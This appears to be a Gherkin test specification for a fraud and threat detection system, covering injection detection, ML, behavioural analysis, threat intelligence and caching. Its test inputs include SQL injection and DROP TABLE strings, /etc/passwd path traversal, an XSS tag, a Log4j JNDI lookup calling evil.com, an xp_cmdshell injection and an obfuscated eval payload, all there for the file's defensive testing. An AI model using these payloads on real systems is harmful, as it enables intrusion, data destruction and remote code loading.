Feature: Enhanced Fraud Detection System
  As a security engineer
  I want to test advanced fraud detection capabilities
  So that I can ensure comprehensive security monitoring

  Background:
    Given the enhanced fraud checker is initialized with:
      | Setting                | Value |
      | enableML              | true  |
      | enableBehaviorAnalysis| true  |
      | enableThreatIntel     | true  |
      | cacheTimeout          | 1000  |
      | logLevel              | info  |

  @automated @security
  Scenario: Detect sophisticated SQL injection patterns
    When I analyze the following SQL code:
      """
      SELECT * FROM users WHERE id = '1' OR '1'='1'
      """
    Then the fraud confidence should be at least 40
    And the threat type should be "SQL_INJECTION"

  @manual
  Scenario: Manual validation of SQL injection detection
    Given the tester has access to the fraud checker interface
    When the tester inputs various SQL injection patterns:
      | Pattern                          | Expected Detection |
      | ' OR '1'='1                      | High confidence    |
      | UNION SELECT * FROM passwords    | Critical           |
      | ; DROP TABLE users; --           | Critical           |
      | ' AND 1=CAST((SELECT @@version) AS INT) | High confidence |
    Then verify each pattern is correctly identified
    And verify appropriate alerts are generated

  @automated @security
  Scenario Outline: Detect various injection attack patterns
    When I analyze code containing "<pattern>"
    Then the fraud confidence should be at least <confidence>
    And the threat type should include "<threat_type>"

    Examples:
      | pattern                           | confidence | threat_type      |
      | ../../../etc/passwd               | 30         | PATH_TRAVERSAL   |
      | <script>alert('XSS')</script>     | 35         | XSS_ATTACK       |
      | ${jndi:ldap://evil.com/payload}   | 45         | LOG4J_EXPLOIT    |
      | '; exec xp_cmdshell 'cmd.exe'     | 50         | COMMAND_INJECTION|

  @manual
  Scenario: Manual validation of multi-vector attack detection
    Given the tester has a test environment with various attack vectors
    When the tester performs the following tests:
      | Attack Type       | Test Case                      | Expected Result        |
      | Path Traversal    | Access sensitive files         | Blocked and logged     |
      | XSS               | Inject malicious scripts       | Sanitized and alerted  |
      | Command Injection | Execute system commands        | Prevented and reported |
      | LDAP Injection    | Manipulate LDAP queries        | Detected and blocked   |
    Then verify all attack vectors are detected
    And verify comprehensive logs are generated

  @automated @ml
  Scenario: Machine learning pattern recognition
    Given I have trained the ML model with known fraud patterns
    When I analyze a new suspicious pattern:
      """
      function maliciousCode() {
        eval(atob('ZG9jdW1lbnQubG9jYXRpb24='));
      }
      """
    Then the ML model should identify it as suspicious
    And the confidence should increase with each similar detection

  @manual
  Scenario: Manual validation of ML fraud detection
    Given the tester has access to the ML training interface
    When the tester performs the following actions:
      | Action                    | Verification                      |
      | Train with fraud samples  | Model accuracy improves           |
      | Test with new patterns    | Similar patterns are detected     |
      | Review false positives    | Model adapts to reduce errors     |
      | Test edge cases           | Reasonable confidence scores      |
    Then verify the ML model improves over time
    And verify detection accuracy meets requirements

  @automated @behavioral
  Scenario: Detect abnormal user behavior patterns
    Given I have a baseline of normal user behavior
    When I observe the following sequence:
      | Action                    | Timestamp  |
      | Login attempt failed      | 00:00:00   |
      | Login attempt failed      | 00:00:01   |
      | Login attempt failed      | 00:00:02   |
      | Login successful          | 00:00:03   |
      | Access sensitive data     | 00:00:05   |
      | Download large files      | 00:00:10   |
    Then the behavior should be flagged as suspicious
    And an alert should be generated

  @manual
  Scenario: Manual validation of behavioral analysis
    Given the tester can simulate user behaviors
    When the tester creates various behavior patterns:
      | Behavior Pattern          | Expected Detection        |
      | Rapid login attempts      | Brute force alert         |
      | Unusual access times      | Anomaly detected          |
      | Data exfiltration pattern | High risk alert           |
      | Privilege escalation      | Security breach warning   |
    Then verify each pattern triggers appropriate alerts
    And verify behavior history is properly tracked

  @automated @threat-intel
  Scenario: Integrate with threat intelligence feeds
    Given I have active threat intelligence feeds
    When I check an IP address "192.168.1.100"
    Then the system should query threat databases
    And return the threat reputation score

  @manual
  Scenario: Manual validation of threat intelligence
    Given the tester has access to threat intel configuration
    When the tester validates threat intelligence features:
      | Feature                | Test                          | Expected Result           |
      | IP reputation check    | Test known malicious IPs      | Flagged as dangerous      |
      | Domain verification    | Check phishing domains        | Marked as suspicious      |
      | Hash lookup            | Verify malware hashes         | Identified as malicious   |
      | CVE correlation        | Match against CVE database    | Vulnerabilities found     |
    Then verify all threat feeds are working
    And verify real-time updates are received

  @automated @performance
  Scenario: Cache performance optimization
    Given the cache is enabled with 1000ms timeout
    When I analyze the same pattern multiple times
    Then subsequent checks should be faster than 10ms
    And the cache hit ratio should be above 90%

  @manual
  Scenario: Manual validation of system performance
    Given the tester has performance monitoring tools
    When the tester conducts performance tests:
      | Test Type            | Metric                | Target            |
      | Response time        | Average latency       | < 100ms           |
      | Throughput           | Requests per second   | > 1000 RPS        |
      | Cache efficiency     | Hit ratio             | > 90%             |
      | Memory usage         | Peak memory           | < 500MB           |
      | CPU utilization      | Average CPU           | < 50%             |
    Then verify all performance targets are met
    And verify system remains stable under load